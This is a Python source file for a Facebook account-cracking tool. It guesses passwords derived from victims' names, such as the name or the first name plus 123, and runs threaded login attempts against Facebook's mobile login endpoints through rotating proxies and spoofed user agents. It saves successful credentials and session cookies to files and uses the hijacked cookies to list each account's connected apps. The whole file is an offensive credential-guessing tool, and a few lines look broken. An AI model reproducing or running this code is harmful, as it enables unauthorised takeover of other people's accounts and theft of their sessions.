###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
ses = requests.Session()
device = platform.platform()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ IMPORT FILE FROM DIRECTORY ]---------- ###
from src import login as Login
from src import dump as Dump
from src import lain as Lain

###----------[ COLOR FOR PRINT ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ COLOR FOR RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()
loop = 0
id,id2,ok,cp = [],[],[],[]
mtd_dev = []
pwx = []
ugen = []
redmi = []
nokia = []
ugen2 =[]
apk = []
azxc = []
pwd_time = int(datetime.now().timestamp())

###----------[ TIME ]---------- ###
now = datetime.now()
day = now.day
month = now.month
year = now.year
month_birthday = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
month_cek = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if month < 0 or month > 12:
		exit()
	month_now = month - 1
except ValueError:exit()
_month_ = month_cek[month_now]
my_date = date.today()
day_now = calendar.day_name[my_date.weekday()]
date_now = ("%s-%s-%s-%s"%(day_now,day,_month_,year))


for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 12;'
	c=random.choice(['SM-S908U','SM-S998U','SAMSUNG SM-991U','SM-S906N'])
	v=random.choice(['Build/SP1A.210812.016; wv)','Build/QP1A.190711.020; wv)'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,104)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku=f'{a} {c} {v} {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0','7.1.2','8.1.0','9','10','11','12','13'])
	c=random.choice(['Redmi Note 4)','Redmi 7)','Redmi Note 7)','Redmi 8)','Redme 6A)','Redmi 8A)','Redmi 6)','Redmi 7A)','Redmi 4X)','Redmi 4A)','Redmi 5)','Redmi 5 Plus)','Redmi Go)','Redmi Y2)','Redmi S2)','Redmi Note 8 Pro)','Redmi Note 8T)'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(50,104)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	x=random.choice(['UCBrowser/12.13.0.1207','OPR/64.3.3282.60839'])
	l=random.choice(['Mobile Safari/537.36','Mobile Safari/E7FBAF'])
	uaku2=f'{aa} {b}; {c} {g}{h}.{i}.{j}.{k} {x} {l}'
	ugen2.append(uaku2)

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"

###----------[ SETTING PASSWORD ]---------- ###
def setting_password(id):
	print("")
	prints(Panel(f"""{P2}succes collecting {len(id)} id""",width=80,padding=(0,23),style=f"{color_table}"))
	set = input(f" {N}do you want to use manual password?[y/n] : ")
	if set in["y","Y"]:
		manual(id)
	else:
		otomatis(id)
	
def aturutuan(id):
	urut = []
	urut.append(Panel(f"{P2}[{color_rich}01{P2}]. id old to new",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}02{P2}]. id new to old",width=24,style=f"{color_table}"))
	urut.append(Panel(f"{P2}[{color_rich}03{P2}]. id random",width=25,style=f"{color_table}"))
	console.print(Columns(urut))
	ask = input(f" {N}choose your choice : ")
	if ask in["1"]:
		for urutan in sorted(id):
			id2.append(urutan)
	elif ask in["2"]:
		mud = []
		for z in sorted(id):
			mud.append(z)
		az=len(mud)
		ax=(az-1)
		for c in range(az):
			id2.append(mud[ax])
			ax -=1
	elif ask in["3"]:
		for urutan in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,urutan)

def manual(id):
	prints(Panel(f"""{P2}create a many password using a comma (,) as a separator""",width=80,style=f"{color_table}"))
	pwx = input(f" {N}create password : ")
	if len(pwx)<=5:
		prints(Panel(f"""{P2}please create a password with at least 6 letters or more""",width=80,style=f"{color_table}"))
		sys.exit()
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_reguler(pwx)
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		manual_validate(pwx)
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		manual_validate(pwx)
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		manual_validate(pwx)

###----------[ PASSWORD OTOMATIS ]---------- ###
def otomatis(id):
	aturutuan(id)
	prints(Panel(f"""{P2}if it appears will make the crack process slower, recommended select n""",width=80,style=f"{color_table}"))
	apli = input(f" {N}do you want to show applications when crack?[y/n] : ")
	if apli in["Y","y"]:
		apk.append("show")
	else:
		pass
	azxc.append(Panel(f"""{P2}[{color_rich}01{P2}]. metode freefb
[{color_rich}02{P2}]. metode mbasic
[{color_rich}03{P2}]. metode mobile""",width=37,title=f"{P2}metode reguler",style=f"{color_table}"))
	azxc.append(Panel(f"""{P2}[{color_rich}04{P2}]. metode freefb
[{color_rich}05{P2}]. metode mbasic
[{color_rich}06{P2}]. metode mobile""",width=37,title=f"{P2}metode validate",style=f"{color_table}"))
	console.print(Columns(azxc))
	log = input(f" {N}choose your url login : ")
	if log in["1","01"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_reguler()
	elif log in["2","02"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_reguler()
	elif log in["3","03"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_reguler()
	elif log in["4","04"]:
		mtd_dev.append("free")
		setting_proxy()
		otomatis_validate()
	elif log in["5","05"]:
		mtd_dev.append("mbasic")
		setting_proxy()
		otomatis_validate()
	elif log in["6","06"]:
		mtd_dev.append("mobile")
		setting_proxy()
		otomatis_validate()
	
def setting_proxy():
	prints(Panel(f"""{P2}if you choose n it will use the previous proxy that already exists""",width=80,style=f"{color_table}"))
	pr = input(f" {N}do you want to use the latest proxy?[y/n] : ")
	if pr in["y","Y"]:
		try:
			os.system('rm -rf data/proxy.txt')
			url = ses.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
			open("data/proxy.txt","w").write(url)
		except:pass
	else:
		pass

###----------[ GENERATE PASSWORD MANUAL ]---------- ###
def manual_reguler(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def manual_validate(pwz):
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid  = user.split("<=>")[0]
					name = user.split("<=>")[1]
					for z in pwz.split(","):
						pwx.append(z)
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()

###----------[ GENERATE PASSWORD OTOMATIS ]----------###
def otomatis_reguler():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
							pwx.append(depan+"123456")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
							pwx.append(depan+"123456")
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_reguler,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
	
def otomatis_validate():
	global prog,des
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id2))
	with prog:
		with ThreadPoolExecutor(max_workers=30) as fall:
			saveresulst()
			for user in id2:
				try:
					pwx = []
					uid,nama = user.split('<=>')[0],user.split('<=>')[1].lower()
					depan = nama.split(" ")[0]
					if len(nama)<=5:
						if len(depan)<3:
							pass 
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
							pwx.append(depan+"123456")
					else:
						if len(depan)<3:
							pwx.append(nama)
						else:
							pwx.append(nama)
							pwx.append(depan+"123")
							pwx.append(depan+"12345")
							pwx.append(depan+"123456")
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
				except Exception as e:
					if "free" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"p.facebook.com")
					elif "mbasic" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"mbasic.facebook.com")
					elif "mobile" in mtd_dev:
						fall.submit(metode_validate,uid,pwx,"m.facebook.com")
	prints(Panel(f"""{P2}successfully cracked {len(id2)} id, with result OK : {H2}{len(ok)}{P2} CP : {K2}{len(cp)}{P2}""",width=80,padding=(0,8),style=f"{color_table}"))
	sys.exit()
    
###----------[ METODE CRACK ]---------- ###
def metode_reguler(user, pwx, url):
	global ok,cp,loop
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	redmi = open('data/mas.txt','r').read().splitlines()
	ua = random.choice(redmi)
	nokia = open('data/nokia1.txt','r').read().splitlines()
	ua2 = random.choice(nokia)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent":ua2,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":f"https://{url}/",
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
				}
			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"email":user,
				"pass":pw
				}
			headers2 = {
				"Host": url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
				}
			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=https%3A%2F%2F{url}%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data, headers=headers2, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{ua}{N}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)

	loop+=1
	
def metode_validate(user, pwx, url):
	global ok,cp,loop
	prox = open("data/proxy.txt","r").read().splitlines()
	prog.update(des,description=f"crack {str(loop)}/{len(id2)} OK : {H}{len(ok)}{N} CP : {K}{len(cp)}{N}")
	prog.advance(des)
	redmi = open('data/mas.txt','r').read().splitlines()
	ua = random.choice(redmi)
	nokia = open('data/nokia1.txt','r').read().splitlines()
	ua2 = random.choice(nokia)
	for pw in pwx:
		try:
			pw = pw.lower()
			ses=requests.Session()
			proxy= {"http": "socks5://{random.choice(prox)}"}
			headers1= {
				"Host":url,
				"upgrade-insecure-requests":"1",
				"user-agent":ua2,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				"referer":f"https://{url}/",
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
				}
			p = ses.get(f"https://{url}/login/?next&ref=dbl&fl&refid=8",headers=headers1)
			data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
				"email":user,
				"pass":pw
				}
			headers2 = {
				"Host": url,
				"cache-control":"max-age=0",
				"upgrade-insecure-requests":"1",
				"origin":f"https://{url}",
				"content-type":"application/x-www-form-urlencoded",
				"user-agent":ua,
				"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"x-requested-with":"com.facebook.katana",
				"sec-fetch-site":"same-origin",
				"sec-fetch-mode":"cors",
				"sec-fetch-user":"empty",
				"sec-fetch-dest":"document",
				'referer':f'https://{url}/login/?next&ref=dbl&fl&refid=8',
				"accept-encoding":"gzip, deflate br",
				"accept-language":"en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7"
				}
			po = ses.post(f"https://{url}/login/device-based/regular/login/?refsrc=https%3A%2F%2F{url}%2F&lwv=100&refid=8",data=data, headers=headers2, proxies=proxy)
			if "c_user" in ses.cookies.get_dict():
				ok.append(user)
				coki = convert(ses.cookies.get_dict())
				user = re.findall('c_user=(.*);xs', coki)[0]
				if "show" in apk:
					get_apk(user,pw,coki)
				else:
					tree = Tree("                                 ")
					tree.add(f"\r{H}{user}|{pw}{P} ")
					tree.add(f"{H}{ua}{N}")
					prints(tree)
				open("OK/%s.txt"%(date_now),"a").write("  * --> %s|%s|%s\n"%(user, pw,coki))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp.append(user)
				tree = Tree("                                 ")
				tree.add(f"\r{K}{user}|{pw}{P} ")
				prints(tree)
				open("CP/%s.txt"%(date_now),"a").write("  * --> %s|%s\n"%(user, pw))
				break
		except requests.exceptions.ConnectionError:
			sleep(32)

	loop+=1
		
###----------[ CONVET LANGUAGE ]---------- ###
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

###----------[ GET APK FROM COOKIE ]---------- ###
def get_apk(user,pw,cok):
	cookie = {"cookie":cok}
	language(cookie)
	tree = Tree("                                 ")
	tree.add(f"\r{H}{user}|{pw}{N} ")
	tree.add(f"\r{H}{cok}{N}")
	try:
		active = Tree(f"\r{N}active application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,active,cookie)
	except Exception as e:
		print(e)
	try:
		inactive = Tree(f"\r{N}inactive application :")
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,inactive,cookie)
	except Exception as e:
		print(e)
	tree.add(active)
	tree.add(inactive)
	prints(tree)
		
###----------[ GET APK ACTIVE ]---------- ###
def get_active(url,active,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Ditambahkan" in apk.text:
				active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',' Ditambahkan')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_active(next,active,cookie)
	except:pass

###----------[ GET APK INACTIVE ]---------- ###
def get_inactive(url,inactive,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).text,"html.parser")
		for apk in data.find_all("h3"):
			if "Kedaluwarsa" in apk.text:
				inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}{N}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
		get_inactive(next,inactive,cookie)
	except:pass

###----------[ CONVERT COOKIE ]---------- ###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
	
###----------[ PRINT SAVE RESULTS ]---------- ###
def saveresulst():
	prints(Panel(f"""\r{P2}results acoount ok saved to : {date_now}
results acoount cp saved to : {date_now}""",width=80,padding=(0,10),style=f"{color_table}"))
